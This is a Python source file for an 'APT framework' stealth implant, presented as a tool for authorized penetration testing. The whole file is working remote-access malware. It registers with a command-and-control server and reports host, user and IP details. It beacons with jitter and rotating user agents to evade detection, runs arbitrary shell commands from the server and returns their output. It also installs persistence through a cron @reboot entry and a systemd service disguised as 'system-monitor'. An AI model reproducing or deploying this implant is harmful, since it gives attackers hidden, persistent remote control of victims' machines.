"""
APT Framework - Stealth Agent/Implant
⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY

This agent is for educational and authorized testing purposes only.
Unauthorized use is illegal.
"""

import asyncio
import platform
import socket
import uuid
import subprocess
import os
import sys
import logging
from datetime import datetime
import random
import json

# Add parent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

import aiohttp
from common.crypto import SecureComm, Obfuscator
from common.protocol import Message, MessageType, Command, CommandType


logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)


class StealthAgent:
    """Stealth agent with evasion capabilities"""

    def __init__(
        self,
        c2_url: str = "http://127.0.0.1:8443",
        password: str = "C2Password123",
        beacon_interval: int = 5,
        jitter: float = 0.3
    ):
        self.c2_url = c2_url
        self.crypto = SecureComm(password)
        self.beacon_interval = beacon_interval
        self.jitter = jitter
        self.agent_id = self._generate_agent_id()
        self.running = False
        self.registered = False

        # Stealth features
        self.obfuscator = Obfuscator()
        self.user_agent_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]

        logger.info(f"Agent initialized: {self.agent_id}")

    def _generate_agent_id(self) -> str:
        """Generate unique agent ID"""
        # Use UUID based on hostname and MAC address for consistency
        hostname = socket.gethostname()
        return str(uuid.uuid5(uuid.NAMESPACE_DNS, hostname))

    def _get_system_info(self) -> dict:
        """Collect system information"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
        except:
            hostname = "unknown"
            ip = "unknown"

        return {
            "hostname": hostname,
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "ip": ip,
            "python_version": platform.python_version()
        }

    def _get_random_user_agent(self) -> str:
        """Get random user agent for stealth"""
        return random.choice(self.user_agent_list)

    def _calculate_sleep(self) -> float:
        """Calculate sleep time with jitter"""
        jitter_amount = self.beacon_interval * self.jitter
        return self.beacon_interval + random.uniform(-jitter_amount, jitter_amount)

    async def _send_message(self, message: Message) -> dict:
        """Send encrypted message to C2"""
        try:
            encrypted_data = self.crypto.encrypt(message.to_bytes())

            headers = {
                "User-Agent": self._get_random_user_agent(),
                "Content-Type": "application/octet-stream"
            }

            async with aiohttp.ClientSession() as session:
                endpoint = "/register" if message.msg_type == MessageType.REGISTER.value else "/beacon"
                url = f"{self.c2_url}{endpoint}"

                async with session.post(url, data=encrypted_data, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        encrypted_response = await response.read()
                        decrypted_response = self.crypto.decrypt(encrypted_response)
                        response_msg = Message.from_bytes(decrypted_response)
                        return response_msg.data
                    else:
                        logger.error(f"C2 response status: {response.status}")
                        return None
        except Exception as e:
            logger.error(f"Communication error: {e}")
            return None

    async def register(self):
        """Register with C2 server"""
        logger.info("Registering with C2...")
        system_info = self._get_system_info()

        message = Message(
            msg_type=MessageType.REGISTER,
            agent_id=self.agent_id,
            data=system_info
        )

        response = await self._send_message(message)
        if response:
            self.registered = True
            logger.info("✅ Registered with C2")
            return True
        else:
            logger.error("❌ Registration failed")
            return False

    async def beacon(self):
        """Send beacon to C2"""
        message = Message(
            msg_type=MessageType.HEARTBEAT,
            agent_id=self.agent_id,
            data={"status": "alive"}
        )

        response = await self._send_message(message)
        if response and "commands" in response:
            commands = response["commands"]
            if commands:
                logger.info(f"Received {len(commands)} command(s)")
                for cmd_dict in commands:
                    command = Command.from_dict(cmd_dict)
                    await self._execute_command(command)

    async def _execute_command(self, command: Command):
        """Execute received command"""
        logger.info(f"Executing command: {command.cmd_type}")

        try:
            result = None

            if command.cmd_type == CommandType.SHELL:
                result = await self._execute_shell(command.params.get("cmd"))
            elif command.cmd_type == CommandType.SYSINFO:
                result = self._get_system_info()
            elif command.cmd_type == CommandType.SLEEP:
                self.beacon_interval = command.params.get("interval", 5)
                result = {"status": "Beacon interval updated", "new_interval": self.beacon_interval}
            elif command.cmd_type == CommandType.KILL:
                result = {"status": "Agent terminating"}
                self.running = False
            else:
                result = {"error": f"Unknown command type: {command.cmd_type}"}

            # Send result back
            await self._send_result(command.cmd_id, result)

        except Exception as e:
            logger.error(f"Command execution error: {e}")
            await self._send_result(command.cmd_id, {"error": str(e)})

    async def _execute_shell(self, cmd: str) -> dict:
        """Execute shell command"""
        try:
            process = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()

            return {
                "stdout": stdout.decode('utf-8', errors='ignore'),
                "stderr": stderr.decode('utf-8', errors='ignore'),
                "returncode": process.returncode
            }
        except Exception as e:
            return {"error": str(e)}

    async def _send_result(self, command_id: str, result: any):
        """Send command result to C2"""
        message = Message(
            msg_type=MessageType.RESULT,
            agent_id=self.agent_id,
            data=result,
            command_id=command_id
        )
        await self._send_message(message)

    async def run(self):
        """Main agent loop"""
        self.running = True

        # Register with C2
        while not self.registered and self.running:
            if await self.register():
                break
            await asyncio.sleep(self._calculate_sleep())

        # Main beacon loop
        while self.running:
            try:
                await self.beacon()
                sleep_time = self._calculate_sleep()
                await asyncio.sleep(sleep_time)
            except KeyboardInterrupt:
                logger.info("Agent stopped by user")
                break
            except Exception as e:
                logger.error(f"Agent error: {e}")
                await asyncio.sleep(self._calculate_sleep())

        logger.info("Agent terminated")


class PersistenceManager:
    """Manage agent persistence mechanisms"""

    @staticmethod
    def install_linux_cron(script_path: str) -> bool:
        """Install cron persistence on Linux"""
        try:
            cron_entry = f"@reboot python3 {script_path} &\n"
            subprocess.run(
                f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -',
                shell=True,
                check=True
            )
            return True
        except:
            return False

    @staticmethod
    def install_linux_systemd(script_path: str, service_name: str = "system-monitor") -> bool:
        """Install systemd service persistence"""
        service_content = f"""[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        try:
            service_path = f"/etc/systemd/system/{service_name}.service"
            with open(service_path, 'w') as f:
                f.write(service_content)
            subprocess.run(["systemctl", "daemon-reload"], check=True)
            subprocess.run(["systemctl", "enable", service_name], check=True)
            return True
        except:
            return False


async def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(description="APT Agent")
    parser.add_argument("--c2", default="http://127.0.0.1:8443", help="C2 server URL")
    parser.add_argument("--password", default="C2Password123", help="Encryption password")
    parser.add_argument("--interval", type=int, default=5, help="Beacon interval")
    parser.add_argument("--jitter", type=float, default=0.3, help="Beacon jitter")

    args = parser.parse_args()

    print("⚠️  APT SIMULATION AGENT - FOR AUTHORIZED TESTING ONLY")
    print(f"Connecting to C2: {args.c2}")

    agent = StealthAgent(
        c2_url=args.c2,
        password=args.password,
        beacon_interval=args.interval,
        jitter=args.jitter
    )

    await agent.run()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Agent stopped")
